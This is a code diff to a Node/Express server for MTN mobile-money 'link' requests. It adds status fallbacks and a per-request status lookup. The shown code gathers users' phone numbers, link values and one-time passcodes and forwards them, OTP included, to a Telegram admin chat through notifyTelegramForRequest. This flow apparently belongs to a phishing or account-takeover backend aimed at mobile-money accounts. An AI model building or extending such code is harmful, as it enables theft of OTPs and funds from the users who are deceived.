@@ -432,6 +432,9 @@ app.post('/api/mtn/momo-link', (req, res) => {
       existing.phone = phone;
       existing.step = 'link';
       existing.status = 'pending';
+      if (!isAdminApprovalConfigured()) {
+        existing.status = 'otp_pending';
+      }
     }
   }
 
@@ -461,15 +464,19 @@ app.post('/api/mtn/submit-link', (req, res) => {
       step: 'link',
       link: fullLinkValue,
     });
+    if (!isAdminApprovalConfigured()) {
+      const created = requests.get(resolvedRequestId) || demoMtnRequests.get(resolvedRequestId);
+      if (created) created.status = 'otp_pending';
+    }
   } else {
     const existing = requests.get(resolvedRequestId) || demoMtnRequests.get(resolvedRequestId);
     if (existing) {
       existing.link = fullLinkValue;
       existing.phone = resolvedPhone;
-      existing.status = 'pending';
       existing.step = 'link';
 
-      if (api && ADMIN_CHAT_ID) {
+      if (isAdminApprovalConfigured()) {
+        existing.status = 'pending';
         notifyTelegramForRequest(resolvedRequestId, {
           plan: existing.plan,
           price: existing.price,
@@ -479,6 +486,8 @@ app.post('/api/mtn/submit-link', (req, res) => {
           otp: existing.otp || '—',
           link: existing.link || ''
         });
+      } else {
+        existing.status = 'otp_pending';
       }
     }
   }
@@ -503,6 +512,11 @@ app.post('/api/mtn/demo-approve', (req, res) => {
 });
 
 app.get('/api/check-status', (req, res) => {
+  const requestId = String(req.query.requestId || '');
+  if (requestId) {
+    const request = requests.get(requestId) || demoMtnRequests.get(requestId);
+    if (request) return res.json({ status: request.status, requestId });
+  }
   res.json({ status: 'pending' });
 });
 
